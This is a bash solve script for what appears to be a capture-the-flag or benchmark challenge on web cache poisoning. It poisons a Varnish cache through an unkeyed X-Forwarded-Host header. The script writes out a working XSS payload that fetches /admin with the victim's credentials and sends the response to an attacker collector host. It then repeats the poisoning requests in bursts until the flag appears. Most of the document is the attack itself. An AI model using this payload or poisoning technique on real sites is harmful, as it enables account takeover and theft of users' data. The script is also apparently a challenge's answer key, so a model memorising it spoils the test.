#!/usr/bin/env bash
# APEX-028-25 — "Web Cache Poisoning" (tags: cache_poisoning, xss)
#
# The backend reflects `X-Forwarded-Host` into the page's canonical link, and
# Varnish keys its cache on host and path and nothing else. So the header is
# *unkeyed*: it changes the response and does not change the entry the response
# is stored under. One request from anybody replaces the cached homepage for
# everybody.
#
# That is the difference from ordinary reflected XSS worth stating plainly. A
# reflected payload needs the victim to follow the attacker's link. A poisoned
# cache needs the victim to visit the site.
#
# A hit never reaches the backend, and a payload that never reaches the backend
# is never reflected — so poisoning is a race against the entry already in the
# cache. This VCL defines `vcl_recv` twice and the second copy, the one holding
# the `PURGE` branch, is unreachable, so there is no way to empty the cache on
# request. What is left is the clock: the entry lives 120 seconds, and a
# poisoning request repeated every few seconds is the one that repopulates it
# whenever it expires.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
HOST="${URL%:*}"
CACHE="${CACHE_URL:-$HOST:8028}"
COLLECTOR="${COLLECTOR_URL:-$HOST:9999}"
SESSION="apex028-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# The reflection reaches four places. The `<script src>` is the tidiest —
# point it at a host that serves JavaScript and the bank's page loads the
# attacker's script from the bank's origin — but the script that host serves
# reads `document.cookie`, and this session cookie is `HttpOnly`, so it reads
# nothing.
#
# The breakout therefore goes through the canonical link, and the injected
# script asks the *application* rather than the browser. Cross-site scripting
# does not need to read a cookie; it needs to act as the person who has one.
# `/admin` prints the flag to an administrator, and `fetch` sends the cookie
# whether or not JavaScript is allowed to look at it.
PAYLOAD="$(cat <<'HTML'
"><script>fetch("/admin",{credentials:"include"}).then(r=>r.text()).then(t=>{new Image().src="http://attacker-server:9999/steal?c="+encodeURIComponent(t)})</script><x y="
HTML
)"

# Opened on a path the cache does not hold, so that this session's own first
# request does not become the clean entry that then has to expire.
"$H5I" browser open "$CACHE/login" --session "$SESSION" --new --capture >/dev/null

# `Host: varnish`, because the cache key is URL plus host and the victim is
# inside the compose network: the admin bot asks for `http://varnish/`, so a
# poisoned entry filed under `127.0.0.1:8028` is one nobody will ever read.
# Poisoning a cache means poisoning the entry the victim's request will hash to.
#
# Ten at a time, because the victim is refreshing too: the admin bot reads the
# homepage every thirty seconds, and whichever request arrives first after the
# entry expires is the one that repopulates it. A burst makes that ours.
FOUND="no flag found"
for _ in $(seq 1 60); do
    "$H5I" websec replay req_0 --session "$SESSION" --create --reset-budget \
        --repeat 10 \
        --set path=/ --set header.Host=varnish \
        --set "header.X-Forwarded-Host=$PAYLOAD" >/dev/null
    "$H5I" browser navigate "$COLLECTOR/cookies" --session "$SESSION" >/dev/null
    LATEST="$(last "$SESSION")"
    FOUND="$("$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw | flag)"
    [ "$FOUND" != "no flag found" ] && break
    sleep 1
done
printf '%s\n' "$FOUND"
